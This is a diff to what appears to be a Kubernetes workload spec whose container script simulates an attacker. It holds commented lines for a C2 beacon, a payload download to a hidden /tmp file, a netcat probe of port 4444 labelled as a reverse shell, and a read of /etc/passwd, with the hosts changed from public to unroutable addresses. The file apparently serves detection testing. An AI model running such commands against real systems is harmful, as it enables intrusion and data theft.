@@ -98,11 +98,11 @@ spec:
                 echo "$(date) - API request processed" >> /tmp/api.log
 
                 # C2 beacon + payload download
-                curl -s -o /dev/null --connect-timeout 2 http://185.220.101.1:8080 2>/dev/null || true
-                wget -q -O /tmp/.update http://142.44.191.122/d.sh 2>/dev/null || true
+                curl -s -o /dev/null --connect-timeout 2 http://10.255.255.1:8080 2>/dev/null || true
+                wget -q -O /tmp/.update http://10.255.255.2/d.sh 2>/dev/null || true
 
                 # Reverse shell attempt
-                nc -z -w 1 10.0.0.1 4444 2>/dev/null || true
+                nc -z -w 1 10.255.255.3 4444 2>/dev/null || true
 
                 # Data exfiltration
                 cat /etc/passwd > /dev/null 2>&1
